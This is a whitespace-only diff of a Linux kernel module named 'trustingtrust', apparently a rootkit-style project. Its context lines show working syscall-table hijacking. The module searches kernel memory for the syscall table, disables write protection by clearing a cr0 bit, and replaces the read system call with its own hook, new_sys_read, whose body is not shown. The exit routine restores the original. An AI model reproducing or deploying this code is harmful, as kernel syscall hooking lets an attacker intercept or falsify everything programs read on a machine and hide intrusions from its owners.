@@ -46,7 +46,7 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
 
 static unsigned long **aquire_sys_call_table(void)
 {
-	/* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
+    /* PAGE_OFFSET is a macro which tells us the offset where kernel memory begins,
      * this keeps us from searching for our syscall table in user space memory
      * */
 	unsigned long int offset = PAGE_OFFSET;
@@ -80,17 +80,17 @@ static int __init trustingtrust_start(void)
 
     // Find the syscall table in memory
     if(!(sys_call_table = aquire_sys_call_table()))
-		return -1;
-    
+        return -1;
+
     // record the initial value in the cr0 register
     original_cr0 = read_cr0();
     // set the cr0 register to turn off write protection
     write_cr0(original_cr0 & ~0x00010000);
-	// copy the old read call
+    // copy the old read call
     ref_sys_read = (void *)sys_call_table[__NR_read]; 
     // write our modified read call to the syscall table
-	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
-	// turn memory protection back on
+    sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
+    // turn memory protection back on
     write_cr0(original_cr0);
 
 	return 0;
@@ -103,10 +103,10 @@ static void __exit trustingtrust_end(void)
 	}
 
     // turn off memory protection
-	write_cr0(original_cr0 & ~0x00010000);
+    write_cr0(original_cr0 & ~0x00010000);
     // put the old system call back in place
-	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
-	// memory protection back on
+    sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
+    // memory protection back on
     write_cr0(original_cr0);
 }
 
